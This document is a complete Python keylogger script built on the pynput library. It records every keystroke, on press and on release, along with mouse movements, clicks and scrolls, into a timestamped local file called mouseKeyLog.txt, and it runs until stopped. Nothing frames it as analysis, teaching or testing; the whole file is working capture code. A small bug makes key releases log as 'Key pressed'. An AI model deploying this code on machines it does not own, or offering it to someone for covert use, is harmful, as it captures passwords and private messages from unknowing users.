from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
import logging

log_dir = ""
logging.basicConfig(filename = "mouseKeyLog.txt", level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    if str(key).startswith("Key"):
        mykey = str(key)
        logging.info("Key pressed: '{0}'".format(mykey[4:]))
    else:
        logging.info("Key pressed: {0}".format(key))

def on_release(key):
    if str(key).startswith("Key"):
        mykey = str(key)
        logging.info("Key pressed: '{0}'".format(mykey[4:]))
    else:
        logging.info("Key pressed: {0}".format(key))

def on_move(x,y):
    #print("Mouse Mover")
    logging.info("Mouse move to ({0},{1})".format(x,y))

def on_click(x, y, button, pressed):
    #print("Mouse Clicked")
    if pressed:
        logging.info('Mouse clicked at ({0},{1}) with {2}'.format(x,y,button))

def on_scroll(x, y, dx, dy):
    #print("Mouse Scrolled")
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

# Setup the listener threads
keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)
mouse_listener = MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

# Start the threads and join them so the script doesn't end early
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()